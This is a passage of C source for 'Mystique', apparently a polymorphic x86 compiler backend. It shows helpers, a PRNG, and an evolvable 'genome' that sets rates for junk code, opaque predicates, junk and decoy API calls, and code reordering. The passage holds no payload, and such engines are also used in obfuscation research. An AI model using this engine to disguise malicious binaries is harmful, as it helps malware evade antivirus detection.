// backend_mystc.c - Bootstrap version of polymorphic backend
// Compile with:
//   GCC/MinGW (Windows): gcc -o backend.exe backend_mystc.c -O2
//   MSVC (Windows):      cl /Fe:backend.exe backend_mystc.c /O2
//   GCC (Linux):         gcc -o backend backend_mystc.c -O2
// Usage: backend[.exe] input.mcb [options]
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <time.h>

#ifdef _MSC_VER
#include <io.h>
#define _CRT_SECURE_NO_WARNINGS
#endif

#ifndef _WIN32
#include <unistd.h>
#endif

// =============================================================================
// File Layout
// =============================================================================
//   0. Helpers (C-only utilities: annotation, types, buffer, PRNG)
//   1. Genome Module
//   2. IR Module
//   3. Bytecode Module
//   4. x86 Module
//   5. Code Generator Module
//   6. Assemble Module
//   7. Backend Module
// =============================================================================

// =============================================================================
//
// Helpers
//
// C-only support code with no MC-backend parallel:
//   - Annotation system (JSON source-map for the visualizer)
//   - Core types & constants
//   - Dynamic Buffer
//   - PRNG (xorshift128+)
//
// =============================================================================

// =============================================================================
// ANNOTATION SYSTEM — Source map for the Mystique visualizer
// Activated via --annotate <path>; writes a JSON sidecar alongside the .bin.
// =============================================================================

static FILE* g_annot            = NULL;
static int   g_annot_first_func = 1;
static int   g_annot_first_ann  = 1;
static int   g_annot_in_func    = 0;
static int   g_last_dead_pattern = -1;   /* set by emit_junk_sequence  */
static int   g_last_opaque_form  = -1;   /* set by emit_opaque_true    */
static int*  g_junk_ra_alloc     = NULL; /* when set, pick_free_reg uses RA state */
static int   g_junk_ra_num_regs  = 0;
static int*  g_junk_ra_reg_order = NULL;
static int   g_ir_seq            = 0;    /* per-function IR instruction counter */

static void annot_open(const char* path, unsigned int seed_val) {
    g_annot = fopen(path, "w");
    if (!g_annot) return;
    fprintf(g_annot, "{\n  \"seed\": %u,\n  \"functions\": [\n", seed_val);
    g_annot_first_func = 1;
    g_annot_in_func    = 0;
}

static void annot_close(void) {
    if (!g_annot) return;
    if (g_annot_in_func) {
        fprintf(g_annot, "\n    ],\n    \"end_offset\": -1\n  }");
    }
    fprintf(g_annot, "\n  ]\n}\n");
    fclose(g_annot);
    g_annot = NULL;
}

static void annot_begin_func(const char* name, const char* kind, int offset) {
    if (!g_annot) return;
    if (g_annot_in_func) {
        fprintf(g_annot, "\n    ],\n    \"end_offset\": %d\n  }", offset);
    }
    if (!g_annot_first_func) fprintf(g_annot, ",\n");
    g_annot_first_func = 0;
    fprintf(g_annot, "  {\n    \"name\": \"%s\", \"kind\": \"%s\", \"offset\": %d,\n    \"annotations\": [",
            name, kind, offset);
    g_annot_first_ann = 1;
    g_annot_in_func   = 1;
    if (strcmp(kind, "real") == 0) g_ir_seq = 0;
}

static void annot_end_func(int end_offset) {
    if (!g_annot || !g_annot_in_func) return;
    fprintf(g_annot, "\n    ],\n    \"end_offset\": %d\n  }", end_offset);
    g_annot_in_func = 0;
}

static void annot_emit(int offset, int size, const char* kind, const char* extra) {
    if (!g_annot || !g_annot_in_func || size <= 0) return;
    if (!g_annot_first_ann) fprintf(g_annot, ",");
    g_annot_first_ann = 0;
    if (extra && extra[0])
        fprintf(g_annot, "\n      {\"offset\":%d,\"size\":%d,\"kind\":\"%s\",%s}", offset, size, kind, extra);
    else
        fprintf(g_annot, "\n      {\"offset\":%d,\"size\":%d,\"kind\":\"%s\"}", offset, size, kind);
}

static const char* get_opname(int op) {
    switch (op) {
        case  0: return "NOP";      case  1: return "CONST";    case  2: return "COPY";
        case 16: return "ADD";      case 17: return "SUB";      case 18: return "MUL";
        case 19: return "DIV";      case 20: return "MOD";      case 21: return "NEG";
        case 32: return "AND";      case 33: return "OR";       case 34: return "XOR";
        case 35: return "NOT";      case 36: return "SHL";      case 37: return "SHR";
        case 48: return "EQ";       case 49: return "NE";       case 50: return "LT";
        case 51: return "LE";       case 52: return "GT";       case 53: return "GE";
        case 64: return "LOAD";     case 65: return "STORE";    case 66: return "ADDR";
        case 67: return "PTRADD";   case 68: return "FIELDPTR"; case 69: return "ALLOCA";
        case 80: return "JMP";      case 81: return "JZ";       case 82: return "JNZ";
        case 96: return "CALL";     case 97: return "CALLV";
        case 98: return "RET";      case 99: return "RETV";
        case 100: return "ICALL";   case 101: return "ICALLV";
        case 102: return "FUNC_ADDR";
        case 112: return "EMIT";
        default: return "???";
    }
}

static void annot_real(int off, int sz, const char* op) {
    char extra[128];
    snprintf(extra, sizeof(extra), "\"ir_op\":\"%s\",\"ir_seq\":%d", op ? op : "???", g_ir_seq);
    g_ir_seq++;
    annot_emit(off, sz, "real", extra);
}

static void annot_dead(int off, int sz) {
    char extra[32];
    snprintf(extra, sizeof(extra), "\"pattern\":%d", g_last_dead_pattern);
    annot_emit(off, sz, "dead_code", extra);
}

static void annot_opaque(int off, int sz) {
    char extra[32];
    snprintf(extra, sizeof(extra), "\"form\":%d", g_last_opaque_form);
    annot_emit(off, sz, "opaque_predicate", extra);
}

static void annot_nop_v(int off, int sz) {
    annot_emit(off, sz, "nop_variant", "");
}

static void annot_block_label(int off, const char* label) {
    if (!g_annot || !g_annot_in_func) return;
    if (!g_annot_first_ann) fprintf(g_annot, ",");
    g_annot_first_ann = 0;
    fprintf(g_annot, "\n      {\"offset\":%d,\"size\":0,\"kind\":\"block_label\",\"label\":\"%s\"}", off, label ? label : "");
}

static void annot_special(int off, int sz, const char* kind) {
    annot_emit(off, sz, kind, "");
}

static void annot_junk_call_ann(int off, int sz) {
    annot_emit(off, sz, "junk_call", "");
}

// =============================================================================
// CORE: types.c - Basic types, constants, and initialization
// =============================================================================

// Boolean constants
int TRUE = 1;
int FALSE = 0;

// x86-32 Register IDs
int REG_EAX = 0;
int REG_ECX = 1;
int REG_EDX = 2;
int REG_EBX = 3;
int REG_ESP = 4;
int REG_EBP = 5;
int REG_ESI = 6;
int REG_EDI = 7;
int REG_COUNT = 8;

// Type codes
int TC_VOID = 0;
int TC_I8 = 1;
int TC_I32 = 2;
int TC_PTR = 3;

// IR Opcodes
int OP_NOP = 0;
int OP_CONST = 1;
int OP_COPY = 2;
int OP_ADD = 16;
int OP_SUB = 17;
int OP_MUL = 18;
int OP_DIV = 19;
int OP_MOD = 20;
int OP_NEG = 21;
int OP_AND = 32;
int OP_OR = 33;
int OP_XOR = 34;
int OP_NOT = 35;
int OP_SHL = 36;
int OP_SHR = 37;
int OP_EQ = 48;
int OP_NE = 49;
int OP_LT = 50;
int OP_LE = 51;
int OP_GT = 52;
int OP_GE = 53;
int OP_LOAD = 64;
int OP_STORE = 65;
int OP_ADDR = 66;
int OP_PTRADD = 67;
int OP_FIELDPTR = 68;
int OP_ALLOCA = 69;
int OP_JMP = 80;
int OP_JZ = 81;
int OP_JNZ = 82;
int OP_CALL = 96;
int OP_CALLV = 97;
int OP_RET = 98;
int OP_RETV = 99;
int OP_ICALL = 100;
int OP_ICALLV = 101;
int OP_FUNC_ADDR = 102;
int OP_SYSCALL = 103;   // Linux INT 0x80: dest, num, a1..a5 (6 args fixed)
int OP_EMIT = 112;

// Value kinds (operand types)
int VK_TEMP = 0;
int VK_PARAM = 1;
int VK_LOCAL = 2;
int VK_GLOBAL = 3;
int VK_CONST = 4;
int VK_STRING = 5;
int VK_FUNC = 6;
int VK_TEMP_EXT = 128;

// Condition codes (x86)
int CC_O = 0;
int CC_NO = 1;
int CC_B = 2;
int CC_AE = 3;
int CC_E = 4;
int CC_NE = 5;
int CC_BE = 6;
int CC_A = 7;
int CC_S = 8;
int CC_NS = 9;
int CC_P = 10;
int CC_NP = 11;
int CC_L = 12;
int CC_GE = 13;
int CC_LE = 14;
int CC_G = 15;

// Bytecode format constants
int MC_MAGIC = 0x4E42434D;  // "MCBN"
int MC_VERSION = 1;
int TARGET_X86_32 = 1;
int TARGET_X86_64 = 2;

// Size limits
int MAX_TEMPS = 4096;
int MAX_LOCALS = 256;
int MAX_PARAMS = 16;
int MAX_BLOCKS = 256;
int MAX_INSTRS = 4096;
int MAX_FUNCS = 1024;
int MAX_GLOBALS = 1024;
int MAX_STRINGS = 4096;
int MAX_STRUCTS = 256;

// =============================================================================
// CORE: buffer.c - Dynamic buffer utilities
// =============================================================================

struct Buffer {
    char* data;
    int len;
    int cap;
};

void buf_init(struct Buffer* b, int initial_cap) {
    b->data = (char*)malloc(initial_cap);
    b->len = 0;
    b->cap = initial_cap;
}

struct Buffer* buf_new(int initial_cap) {
    struct Buffer* b = (struct Buffer*)malloc(sizeof(struct Buffer));
    buf_init(b, initial_cap);
    return b;
}

void buf_free(struct Buffer* b) {
    if (b->data != NULL) {
        free(b->data);
    }
    b->data = NULL;
    b->len = 0;
    b->cap = 0;
}

void buf_grow(struct Buffer* b, int need) {
    if (b->len + need <= b->cap) return;

    int new_cap = b->cap * 2;
    while (new_cap < b->len + need) {
        new_cap *= 2;
    }

    char* new_data = (char*)malloc(new_cap);
    memcpy(new_data, b->data, b->len);
    free(b->data);
    b->data = new_data;
    b->cap = new_cap;
}

void buf_write_u8(struct Buffer* b, int val) {
    buf_grow(b, 1);
    b->data[b->len] = val & 0xFF;
    b->len++;
}

void buf_write_u16(struct Buffer* b, int val) {
    buf_grow(b, 2);
    b->data[b->len] = val & 0xFF;
    b->data[b->len + 1] = (val >> 8) & 0xFF;
    b->len += 2;
}

void buf_write_u32(struct Buffer* b, int val) {
    buf_grow(b, 4);
    b->data[b->len] = val & 0xFF;
    b->data[b->len + 1] = (val >> 8) & 0xFF;
    b->data[b->len + 2] = (val >> 16) & 0xFF;
    b->data[b->len + 3] = (val >> 24) & 0xFF;
    b->len += 4;
}

void buf_write_bytes(struct Buffer* b, char* data, int len) {
    buf_grow(b, len);
    memcpy(b->data + b->len, data, len);
    b->len += len;
}

void buf_patch_u32(struct Buffer* b, int pos, int val) {
    b->data[pos] = val & 0xFF;
    b->data[pos + 1] = (val >> 8) & 0xFF;
    b->data[pos + 2] = (val >> 16) & 0xFF;
    b->data[pos + 3] = (val >> 24) & 0xFF;
}

int buf_read_u8(struct Buffer* b, int pos) {
    return (unsigned char)b->data[pos];
}

int buf_read_u16(struct Buffer* b, int pos) {
    return (unsigned char)b->data[pos] |
           ((unsigned char)b->data[pos + 1] << 8);
}

int buf_read_u32(struct Buffer* b, int pos) {
    return (unsigned char)b->data[pos] |
           ((unsigned char)b->data[pos + 1] << 8) |
           ((unsigned char)b->data[pos + 2] << 16) |
           ((unsigned char)b->data[pos + 3] << 24);
}

// =============================================================================
// CORE: prng.c - xorshift128+ PRNG
// =============================================================================

struct Prng {
    uint64_t s0;
    uint64_t s1;
};

void prng_seed(struct Prng* p, uint32_t seed) {
    // Use splitmix64 to initialize state from 32-bit seed
    uint64_t z = seed;
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
    z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
    p->s0 = z ^ (z >> 31);

    z = p->s0;
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
    z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
    p->s1 = z ^ (z >> 31);
}

uint64_t prng_next(struct Prng* p) {
    uint64_t s0 = p->s0;
    uint64_t s1 = p->s1;
    uint64_t result = s0 + s1;

    s1 ^= s0;
    p->s0 = ((s0 << 55) | (s0 >> 9)) ^ s1 ^ (s1 << 14);
    p->s1 = (s1 << 36) | (s1 >> 28);

    return result;
}

int prng_range(struct Prng* p, int max) {
    if (max <= 0) return 0;
    return (int)(prng_next(p) % (uint64_t)max);
}

// =============================================================================
//
// Genome Module
//
// Contains the following sections:
//   1. Genome struct + defaults
//   2. Genome JSON loader
//   3. Genome mutation
//   4. Genome binary serialization
//
// =============================================================================

// =============================================================================
// Genome — mutable probability landscape for polymorphic decisions
// =============================================================================

struct Genome {
    // IR genes
    int unfold_chance;          // 0-100, probability of unfolding a constant
    int unfold_weights[4];      // sum ~1000: add / xor / sub / skip strategy
    int substitute_chance;      // 0-100, probability of substituting an instruction
    int dead_code_chance;       // 0-100, probability of inserting dead IR code
    int dead_code_weights[4];   // sum ~1000: const / add / xor / copy pattern
    int nop_chance;             // 0-100, probability of inserting IR NOPs
    int nop_max_count;          // max NOPs per insertion (1..N)

    // X86 poly instruction genes (weight vectors, each sums to ~1000)
    int add_weights[5];         // 5 ADD encodings
    int sub_weights[4];         // 4 SUB encodings
    int movi_weights[6];        // 6 MOV-immediate encodings (general case)
    int movi_zero_weights[3];   // 3 MOV-zero encodings
    int movi_neg1_weights[3];   // 3 MOV -1 encodings
    int xor_weights[3];         // 3 XOR encodings
    int cmp_weights[2];         // 2 CMP encodings
    int junk_seq_weights[8];    // 8 junk sequence patterns

    // X86 transform genes
    int dead_prologue_pct;      // dead code after function prologue
    int dead_block_pct;         // dead code at block boundaries
    int dead_instr_pct;         // dead code between instructions
    int opaque_pct;             // opaque predicate insertion
    int opaque_weights[3];      // sum ~1000: x(x+1)%2 / x^2>=0 / x|1!=0
    int junk_call_block_pct;    // junk calls at block boundaries
    int junk_call_instr_pct;    // junk calls between instructions
    int harmless_block_pct;     // harmless API at block boundaries
    int harmless_instr_pct;     // harmless API between instructions
    int junk_func_pct;          // junk functions as % of real functions (0-200)

    // Gene expression — controls which transforms are active
    int expression_flags;       // bitmask: bit i = transform i active (all 1s = all on)
    int expression_rate;        // 0-100: probability of flipping each bit during mutation

    // Reorder genes
    int reorder_instrs_intensity;  // 1-10: multiplier on swap attempts per block
    int reorder_locals_chance;     // 0-100: per-function probability of shuffling locals
    int reorder_blocks_chance;     // 0-100: per-function probability of shuffling blocks
    int reorder_funcs_chance;      // 0-100: global probability of shuffling function order
};

struct Genome default_genome() {
    struct Genome g;
    // IR genes — match existing hardcoded defaults
    g.unfold_chance = 35;
    g.unfold_weights[0] = 250; g.unfold_weights[1] = 250;
    g.unfold_weights[2] = 250; g.unfold_weights[3] = 250;
    g.substitute_chance = 40;
    g.dead_code_chance = 25;
    g.dead_code_weights[0] = 250; g.dead_code_weights[1] = 250;
    g.dead_code_weights[2] = 250; g.dead_code_weights[3] = 250;
    g.nop_chance = 20;
    g.nop_max_count = 3;

    // X86 poly instruction genes — uniform weights
    g.add_weights[0] = 200; g.add_weights[1] = 200; g.add_weights[2] = 200;
    g.add_weights[3] = 200; g.add_weights[4] = 200;
    g.sub_weights[0] = 250; g.sub_weights[1] = 250;
    g.sub_weights[2] = 250; g.sub_weights[3] = 250;
    g.movi_weights[0] = 166; g.movi_weights[1] = 167; g.movi_weights[2] = 167;
    g.movi_weights[3] = 167; g.movi_weights[4] = 167; g.movi_weights[5] = 166;
    g.movi_zero_weights[0] = 333; g.movi_zero_weights[1] = 333; g.movi_zero_weights[2] = 334;
    g.movi_neg1_weights[0] = 333; g.movi_neg1_weights[1] = 333; g.movi_neg1_weights[2] = 334;
    g.xor_weights[0] = 333; g.xor_weights[1] = 333; g.xor_weights[2] = 334;
    g.cmp_weights[0] = 500; g.cmp_weights[1] = 500;
    for (int i = 0; i < 8; i++) g.junk_seq_weights[i] = 125;

    // X86 transform genes — match existing hardcoded defaults
    g.dead_prologue_pct = 30;
    g.dead_block_pct = 20;
    g.dead_instr_pct = 10;
    g.opaque_pct = 5;
    g.opaque_weights[0] = 333; g.opaque_weights[1] = 333; g.opaque_weights[2] = 334;
    g.junk_call_block_pct = 8;
    g.junk_call_instr_pct = 3;
    g.harmless_block_pct = 3;
    g.harmless_instr_pct = 1;
    g.junk_func_pct = 50;
    // Gene expression — default: all transforms expressed, 5% flip rate
    g.expression_flags = 0x7FFF;   // bits 0-14 all set (15 transforms)
    g.expression_rate = 5;
    // Reorder genes
    g.reorder_instrs_intensity = 2;
    g.reorder_locals_chance = 100;
    g.reorder_blocks_chance = 100;
    g.reorder_funcs_chance = 100;
    return g;
}

// Weighted selection: pick an index 0..n-1 based on weight vector
int genome_pick(int* weights, int n, struct Prng* prng) {
    int total = 0;
    for (int i = 0; i < n; i++) total += weights[i];
    if (total <= 0) return prng_range(prng, n);  // fallback to uniform
    int r = prng_range(prng, total);
    int cum = 0;
    for (int i = 0; i < n - 1; i++) {
        cum += weights[i];
        if (r < cum) return i;
    }
    return n - 1;
}

// =============================================================================
// Genome JSON loader
// =============================================================================

static void skip_ws(const char** p) {
    while (**p == ' ' || **p == '\t' || **p == '\n' || **p == '\r') (*p)++;
}

static int match_str(const char** p, const char* s) {
    skip_ws(p);
    int len = (int)strlen(s);
    if (strncmp(*p, s, len) == 0) { *p += len; return 1; }
    return 0;
}

static int parse_int(const char** p) {
    skip_ws(p);
    int neg = 0;
    if (**p == '-') { neg = 1; (*p)++; }
    int val = 0;
    while (**p >= '0' && **p <= '9') {
        val = val * 10 + (**p - '0');
        (*p)++;
    }
    return neg ? -val : val;
}

static int parse_int_array(const char** p, int* out, int max_n) {
    skip_ws(p);
    if (**p != '[') return 0;
    (*p)++;
    int count = 0;
    while (count < max_n) {
        skip_ws(p);
        if (**p == ']') { (*p)++; return count; }
        if (count > 0) { skip_ws(p); if (**p == ',') (*p)++; }
        out[count++] = parse_int(p);
    }
    skip_ws(p);
    if (**p == ']') (*p)++;
    return count;
}

static int match_key(const char** p, const char* key) {
    skip_ws(p);
    if (**p != '"') return 0;
    (*p)++;
    int len = (int)strlen(key);
    if (strncmp(*p, key, len) == 0 && (*p)[len] == '"') {
        *p += len + 1;
        skip_ws(p);
        if (**p == ':') (*p)++;
        return 1;
    }
    // Not this key — skip to end of key string
    while (**p && **p != '"') (*p)++;
    if (**p == '"') (*p)++;
    return 0;
}

// Skip one JSON value (number, string, array, object) so we can ignore unknown keys
static void skip_json_value(const char** p) {
    skip_ws(p);
    if (**p == '"') {
        (*p)++;
        while (**p && **p != '"') { if (**p == '\\') (*p)++; (*p)++; }
        if (**p == '"') (*p)++;
    } else if (**p == '[') {
        (*p)++;
        int depth = 1;
        while (**p && depth > 0) {
            if (**p == '[') depth++;
            else if (**p == ']') depth--;
            (*p)++;
        }
    } else if (**p == '{') {
        (*p)++;
        int depth = 1;
        while (**p && depth > 0) {
            if (**p == '{') depth++;
            else if (**p == '}') depth--;
            (*p)++;
        }
    } else {
        // number, bool, null
        while (**p && **p != ',' && **p != '}' && **p != ']') (*p)++;
    }
}

// Declared here (before load/save_genome_json which reference it)
static int g_genome_temperature = 50;  // mutation temperature (0-100)

static int clamp_temperature(int t) {
    if (t < 0) return 0;
    if (t > 100) return 100;
    return t;
}

struct Genome load_genome_json(const char* json) {
    struct Genome g = default_genome();
    const char* p = json;

    skip_ws(&p);
    if (*p == '{') p++;

    while (*p && *p != '}') {
        skip_ws(&p);
        if (*p == ',') { p++; continue; }
        if (*p != '"') break;

        // Save position, try each key
        const char* key_start = p;

        // IR genes
        if (match_key(&p, "unfold_chance"))      { g.unfold_chance = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "unfold_weights"))     { parse_int_array(&p, g.unfold_weights, 4); continue; }
        p = key_start;
        if (match_key(&p, "substitute_chance"))  { g.substitute_chance = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "dead_code_chance"))   { g.dead_code_chance = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "dead_code_weights"))  { parse_int_array(&p, g.dead_code_weights, 4); continue; }
        p = key_start;
        if (match_key(&p, "nop_chance"))         { g.nop_chance = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "nop_max_count"))      { g.nop_max_count = parse_int(&p); continue; }
        p = key_start;

        // X86 poly genes
        if (match_key(&p, "add_weights"))        { parse_int_array(&p, g.add_weights, 5); continue; }
        p = key_start;
        if (match_key(&p, "sub_weights"))        { parse_int_array(&p, g.sub_weights, 4); continue; }
        p = key_start;
        if (match_key(&p, "movi_weights"))       { parse_int_array(&p, g.movi_weights, 6); continue; }
        p = key_start;
        if (match_key(&p, "movi_zero_weights"))  { parse_int_array(&p, g.movi_zero_weights, 3); continue; }
        p = key_start;
        if (match_key(&p, "movi_neg1_weights"))  { parse_int_array(&p, g.movi_neg1_weights, 3); continue; }
        p = key_start;
        if (match_key(&p, "xor_weights"))        { parse_int_array(&p, g.xor_weights, 3); continue; }
        p = key_start;
        if (match_key(&p, "cmp_weights"))        { parse_int_array(&p, g.cmp_weights, 2); continue; }
        p = key_start;
        if (match_key(&p, "junk_seq_weights"))   { parse_int_array(&p, g.junk_seq_weights, 8); continue; }
        p = key_start;

        // X86 transform genes
        if (match_key(&p, "dead_prologue_pct"))  { g.dead_prologue_pct = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "dead_block_pct"))     { g.dead_block_pct = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "dead_instr_pct"))     { g.dead_instr_pct = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "opaque_pct"))         { g.opaque_pct = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "opaque_weights"))     { parse_int_array(&p, g.opaque_weights, 3); continue; }
        p = key_start;
        if (match_key(&p, "junk_call_block_pct")) { g.junk_call_block_pct = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "junk_call_instr_pct")) { g.junk_call_instr_pct = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "harmless_block_pct")) { g.harmless_block_pct = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "harmless_instr_pct")) { g.harmless_instr_pct = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "junk_func_pct")) { g.junk_func_pct = parse_int(&p); continue; }
        p = key_start;

        // Gene expression
        if (match_key(&p, "expression_flags"))   { g.expression_flags = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "expression_rate"))    { g.expression_rate = parse_int(&p); continue; }
        p = key_start;
        // Reorder genes
        if (match_key(&p, "reorder_instrs_intensity")) { g.reorder_instrs_intensity = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "reorder_locals_chance"))    { g.reorder_locals_chance = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "reorder_blocks_chance"))    { g.reorder_blocks_chance = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "reorder_funcs_chance"))     { g.reorder_funcs_chance = parse_int(&p); continue; }
        p = key_start;
        if (match_key(&p, "genome_temperature")) { g_genome_temperature = clamp_temperature(parse_int(&p)); continue; }
        p = key_start;

        // Unknown key — skip key and value
        if (*p == '"') {
            p++;
            while (*p && *p != '"') p++;
            if (*p == '"') p++;
            skip_ws(&p);
            if (*p == ':') p++;
            skip_json_value(&p);
        }
    }
    return g;
}

struct Genome load_genome_file(const char* path) {
    FILE* f = fopen(path, "rb");
    if (!f) {
        fprintf(stderr, "Error: cannot open genome file '%s'\n", path);
        return default_genome();
    }
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);
    char* buf = (char*)malloc(len + 1);
    fread(buf, 1, len, f);
    buf[len] = '\0';
    fclose(f);
    struct Genome g = load_genome_json(buf);
    free(buf);
    return g;
}

// =============================================================================
// Genome binary constants (used by mutation + serialization)
// =============================================================================
#define GENOME_BINARY_VERSION 2
// Total int16 values: IR(13) + x86_poly(34) + x86_xform(12) + expression(2) + reorder(4) = 65
#define GENOME_GENE_COUNT 65

// =============================================================================
// Genome mutation
// =============================================================================

// Mutate a genome in-place using the given PRNG and temperature (0-100).
// Uses flat-array access since struct Genome is all ints.
void mutate_genome(struct Genome* g, struct Prng* prng, int temperature) {
    int step = 1 + temperature / 10;          // probability perturbation range
    int mutation_count = 1 + temperature / 20; // genes mutated per round
    int* genes = (int*)g;

    for (int m = 0; m < mutation_count; m++) {
        int idx = prng_range(prng, GENOME_GENE_COUNT);
        int delta = prng_range(prng, 2 * step + 1) - step;
        genes[idx] += delta;
        if (genes[idx] < 0) genes[idx] = 0;
        if (genes[idx] > 1000) genes[idx] = 1000;
    }

    // Clamp probability genes to [0,100]
    if (g->unfold_chance > 100) g->unfold_chance = 100;
    if (g->substitute_chance > 100) g->substitute_chance = 100;
    if (g->dead_code_chance > 100) g->dead_code_chance = 100;
    if (g->nop_chance > 100) g->nop_chance = 100;
    if (g->dead_prologue_pct > 100) g->dead_prologue_pct = 100;
    if (g->dead_block_pct > 100) g->dead_block_pct = 100;
    if (g->dead_instr_pct > 100) g->dead_instr_pct = 100;
    if (g->opaque_pct > 100) g->opaque_pct = 100;
    if (g->junk_call_block_pct > 100) g->junk_call_block_pct = 100;
    if (g->junk_call_instr_pct > 100) g->junk_call_instr_pct = 100;
    if (g->harmless_block_pct > 100) g->harmless_block_pct = 100;
    if (g->harmless_instr_pct > 100) g->harmless_instr_pct = 100;
    if (g->reorder_locals_chance > 100) g->reorder_locals_chance = 100;
    if (g->reorder_blocks_chance > 100) g->reorder_blocks_chance = 100;
    if (g->reorder_funcs_chance > 100) g->reorder_funcs_chance = 100;

    // Clamp range genes
    if (g->nop_max_count < 1) g->nop_max_count = 1;
    if (g->nop_max_count > 10) g->nop_max_count = 10;
    if (g->reorder_instrs_intensity < 1) g->reorder_instrs_intensity = 1;
    if (g->reorder_instrs_intensity > 10) g->reorder_instrs_intensity = 10;
    if (g->junk_func_pct < 0) g->junk_func_pct = 0;
    if (g->junk_func_pct > 200) g->junk_func_pct = 200;

    // Clamp all weight genes to [1, 900] to prevent degenerate distributions
    for (int i = 0; i < 4; i++) { if (g->unfold_weights[i] < 1) g->unfold_weights[i] = 1; if (g->unfold_weights[i] > 900) g->unfold_weights[i] = 900; }
    for (int i = 0; i < 4; i++) { if (g->dead_code_weights[i] < 1) g->dead_code_weights[i] = 1; if (g->dead_code_weights[i] > 900) g->dead_code_weights[i] = 900; }
    for (int i = 0; i < 5; i++) { if (g->add_weights[i] < 1) g->add_weights[i] = 1; if (g->add_weights[i] > 900) g->add_weights[i] = 900; }
    for (int i = 0; i < 4; i++) { if (g->sub_weights[i] < 1) g->sub_weights[i] = 1; if (g->sub_weights[i] > 900) g->sub_weights[i] = 900; }
    for (int i = 0; i < 6; i++) { if (g->movi_weights[i] < 1) g->movi_weights[i] = 1; if (g->movi_weights[i] > 900) g->movi_weights[i] = 900; }
    for (int i = 0; i < 3; i++) { if (g->movi_zero_weights[i] < 1) g->movi_zero_weights[i] = 1; if (g->movi_zero_weights[i] > 900) g->movi_zero_weights[i] = 900; }
    for (int i = 0; i < 3; i++) { if (g->movi_neg1_weights[i] < 1) g->movi_neg1_weights[i] = 1; if (g->movi_neg1_weights[i] > 900) g->movi_neg1_weights[i] = 900; }
    for (int i = 0; i < 3; i++) { if (g->xor_weights[i] < 1) g->xor_weights[i] = 1; if (g->xor_weights[i] > 900) g->xor_weights[i] = 900; }
    for (int i = 0; i < 2; i++) { if (g->cmp_weights[i] < 1) g->cmp_weights[i] = 1; if (g->cmp_weights[i] > 900) g->cmp_weights[i] = 900; }
    for (int i = 0; i < 8; i++) { if (g->junk_seq_weights[i] < 1) g->junk_seq_weights[i] = 1; if (g->junk_seq_weights[i] > 900) g->junk_seq_weights[i] = 900; }
    for (int i = 0; i < 3; i++) { if (g->opaque_weights[i] < 1) g->opaque_weights[i] = 1; if (g->opaque_weights[i] > 900) g->opaque_weights[i] = 900; }

    // Gene expression mutation: flip random transform bits based on expression_rate
    if (g->expression_rate < 0) g->expression_rate = 0;
    if (g->expression_rate > 100) g->expression_rate = 100;
    for (int bit = 0; bit < 15; bit++) {
        if (prng_range(prng, 100) < g->expression_rate) {
            g->expression_flags ^= (1 << bit);
        }
    }
    // Keep expression_flags in valid range (15 bits)
    g->expression_flags &= 0x7FFF;
}

// Save genome as JSON file
void save_genome_json(struct Genome* g, const char* path) {
    FILE* f = fopen(path, "w");
    if (!f) { fprintf(stderr, "Error: cannot write genome file '%s'\n", path); return; }
    fprintf(f, "{\n");
    fprintf(f, "  \"unfold_chance\": %d,\n", g->unfold_chance);
    fprintf(f, "  \"unfold_weights\": [%d, %d, %d, %d],\n", g->unfold_weights[0], g->unfold_weights[1], g->unfold_weights[2], g->unfold_weights[3]);
    fprintf(f, "  \"substitute_chance\": %d,\n", g->substitute_chance);
    fprintf(f, "  \"dead_code_chance\": %d,\n", g->dead_code_chance);
    fprintf(f, "  \"dead_code_weights\": [%d, %d, %d, %d],\n", g->dead_code_weights[0], g->dead_code_weights[1], g->dead_code_weights[2], g->dead_code_weights[3]);
    fprintf(f, "  \"nop_chance\": %d,\n", g->nop_chance);
    fprintf(f, "  \"nop_max_count\": %d,\n", g->nop_max_count);
    fprintf(f, "  \"add_weights\": [%d, %d, %d, %d, %d],\n", g->add_weights[0], g->add_weights[1], g->add_weights[2], g->add_weights[3], g->add_weights[4]);
    fprintf(f, "  \"sub_weights\": [%d, %d, %d, %d],\n", g->sub_weights[0], g->sub_weights[1], g->sub_weights[2], g->sub_weights[3]);
    fprintf(f, "  \"movi_weights\": [%d, %d, %d, %d, %d, %d],\n", g->movi_weights[0], g->movi_weights[1], g->movi_weights[2], g->movi_weights[3], g->movi_weights[4], g->movi_weights[5]);
    fprintf(f, "  \"movi_zero_weights\": [%d, %d, %d],\n", g->movi_zero_weights[0], g->movi_zero_weights[1], g->movi_zero_weights[2]);
    fprintf(f, "  \"movi_neg1_weights\": [%d, %d, %d],\n", g->movi_neg1_weights[0], g->movi_neg1_weights[1], g->movi_neg1_weights[2]);
    fprintf(f, "  \"xor_weights\": [%d, %d, %d],\n", g->xor_weights[0], g->xor_weights[1], g->xor_weights[2]);
    fprintf(f, "  \"cmp_weights\": [%d, %d],\n", g->cmp_weights[0], g->cmp_weights[1]);
    fprintf(f, "  \"junk_seq_weights\": [%d, %d, %d, %d, %d, %d, %d, %d],\n", g->junk_seq_weights[0], g->junk_seq_weights[1], g->junk_seq_weights[2], g->junk_seq_weights[3], g->junk_seq_weights[4], g->junk_seq_weights[5], g->junk_seq_weights[6], g->junk_seq_weights[7]);
    fprintf(f, "  \"dead_prologue_pct\": %d,\n", g->dead_prologue_pct);
